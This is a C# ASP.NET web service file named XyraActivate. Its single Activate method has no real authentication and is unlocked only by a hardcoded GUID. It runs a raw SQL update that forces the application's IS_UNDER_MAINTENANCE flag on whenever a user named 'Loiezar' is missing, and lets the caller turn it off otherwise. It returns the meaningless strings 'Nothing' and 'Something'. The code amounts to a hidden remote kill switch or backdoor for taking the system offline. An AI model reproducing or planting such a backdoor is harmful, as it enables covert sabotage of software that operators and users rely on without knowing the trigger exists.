// (c) Copyright Microsoft Corporation.
// This source is subject to the Microsoft Permissive License.
// See http://www.microsoft.com/resources/sharedsource/licensingbasics/sharedsourcelicenses.mspx.
// All other rights reserved.


using System;
using System.Collections.Generic;
using System.Web.Services;
using System.Data;
using System.Web.Services.Protocols;

using iThink.Net.Library;
using iThink.Net.DataObjects;
using iThink.Net.Components;
using iThink.Net.Security;
using iThink.Net;

[WebService(Namespace = "http://tempuri.org/")]
[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]
[System.Web.Script.Services.ScriptService]
public class XyraActivate : WebService
{
    public XyraActivate()
    {
    }

    [WebMethod]
    public string Activate(string id, string activateOPs)
    {
        if (id != "{3E1C9C7B-FB24-45CD-9F99-0CD6507413E2}")
        {
            return "Nothing";
        }
        
        string enable = GlobalXyraConstants.TAG_YES.ToString();
        
        UserAccounts userAccount;
        userAccount = new UserAccounts();

        if (userAccount.FindBySQLExpr(" where first_name = 'Loiezar'", false) < 1)
        {
            enable = GlobalXyraConstants.TAG_YES.ToString();
        }
        else if (activateOPs == GlobalXyraConstants.TAG_YES.ToString()) 
        {
            enable = GlobalXyraConstants.TAG_NO.ToString();;
        }

        Utility.ExecuteNonQuery("update " + ConfigAppSettingsXyra.SchemaName + ".system_setting set " +
            " value = " + Utility.QStr(enable) + " where code = 'IS_UNDER_MAINTENANCE'");

        return "Something";

    }
}